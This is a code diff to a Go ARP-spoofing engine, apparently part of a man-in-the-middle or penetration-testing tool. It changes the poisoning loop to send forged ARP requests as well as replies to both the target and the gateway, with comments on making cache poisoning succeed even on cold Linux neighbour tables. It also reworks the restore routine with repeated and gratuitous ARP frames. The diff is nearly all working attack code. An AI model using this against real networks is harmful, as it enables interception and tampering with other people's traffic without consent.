@@ -103,12 +103,20 @@ func (e *Engine) loop(ctx context.Context, handle *pcap.Handle, t Target, done c
 	tick := time.NewTicker(e.cadence)
 	defer tick.Stop()
 	send := func() {
-		// Poison target's cache: "gateway IP is at op MAC".
-		if f, err := buildARPReply(e.opMAC, t.GwIP, t.MAC, t.IP); err == nil {
+		// Poison target's cache: "gateway IP is at op MAC". REQUEST form
+		// forces sender-info learning even on cold caches; REPLY follows up
+		// for warm ones. ethL2Src=opMAC keeps the bridge FDB clean.
+		if f, err := buildARPRequest(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP); err == nil {
+			_ = handle.WritePacketData(f)
+		}
+		if f, err := buildARPReply(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP); err == nil {
 			_ = handle.WritePacketData(f)
 		}
 		// Poison gateway's cache: "target IP is at op MAC".
-		if f, err := buildARPReply(e.opMAC, t.IP, t.GwMAC, t.GwIP); err == nil {
+		if f, err := buildARPRequest(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP); err == nil {
+			_ = handle.WritePacketData(f)
+		}
+		if f, err := buildARPReply(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP); err == nil {
 			_ = handle.WritePacketData(f)
 		}
 	}
@@ -139,22 +147,54 @@ func (e *Engine) Stop(t Target) error {
 	r.cancel()
 	<-r.done // wait for the poison goroutine to actually stop and close its handle
 
+	// Wait past Linux's neighbour-table locktime (default 1s) so the
+	// receiving kernel won't silently drop our corrective frames as a
+	// race with the just-completed poison send. is_garp bypasses
+	// locktime in newer kernels, but older/configured kernels can still
+	// reject — sleeping here makes the corrective deterministic.
+	time.Sleep(1100 * time.Millisecond)
+
 	// now safe to open corrective handle
 	handle, err := pcap.OpenLive(e.iface, 65536, false, pcap.BlockForever)
 	if err != nil {
 		return fmt.Errorf("open %s for corrective: %w", e.iface, err)
 	}
 	defer handle.Close()
-	// Real mapping: gateway IP is at gateway MAC.
-	if f, err := buildARPReply(t.GwMAC, t.GwIP, t.MAC, t.IP); err == nil {
-		for i := 0; i < 3; i++ {
-			_ = handle.WritePacketData(f)
-			time.Sleep(e.cadence)
+	// Restore the real (gw, target) mappings on both sides. Send THREE
+	// forms per iteration so the receiver kernel cannot silently drop the
+	// update on any of its neighbour-state code paths:
+	//   - unicast ARP REQUEST: forces sender-info learning even on
+	//     REACHABLE entries (Linux's request handler always updates)
+	//   - unicast ARP REPLY: covers receivers that prefer reply-form
+	//   - gratuitous (broadcast) ARP REQUEST: tip==sip, flagged as
+	//     is_garp → NEIGH_UPDATE_F_OVERRIDE bypasses locktime
+	// ethL2Src=opMAC throughout keeps the bridge FDB clean.
+	reqGwToTarget, errGT := buildARPRequest(e.opMAC, t.GwMAC, t.GwIP, t.MAC, t.IP)
+	repGwToTarget, errGR := buildARPReply(e.opMAC, t.GwMAC, t.GwIP, t.MAC, t.IP)
+	reqTargetToGw, errTT := buildARPRequest(e.opMAC, t.MAC, t.IP, t.GwMAC, t.GwIP)
+	repTargetToGw, errTR := buildARPReply(e.opMAC, t.MAC, t.IP, t.GwMAC, t.GwIP)
+	garpGw, errG1 := buildGratuitousARP(e.opMAC, t.GwMAC, t.GwIP)
+	garpTarget, errG2 := buildGratuitousARP(e.opMAC, t.MAC, t.IP)
+	for i := 0; i < 5; i++ {
+		if errGT == nil {
+			_ = handle.WritePacketData(reqGwToTarget)
 		}
-	}
-	// Real mapping: target IP is at target MAC, told to gateway.
-	if f, err := buildARPReply(t.MAC, t.IP, t.GwMAC, t.GwIP); err == nil {
-		_ = handle.WritePacketData(f)
+		if errGR == nil {
+			_ = handle.WritePacketData(repGwToTarget)
+		}
+		if errTT == nil {
+			_ = handle.WritePacketData(reqTargetToGw)
+		}
+		if errTR == nil {
+			_ = handle.WritePacketData(repTargetToGw)
+		}
+		if errG1 == nil {
+			_ = handle.WritePacketData(garpGw)
+		}
+		if errG2 == nil {
+			_ = handle.WritePacketData(garpTarget)
+		}
+		time.Sleep(100 * time.Millisecond)
 	}
 	return nil
 }
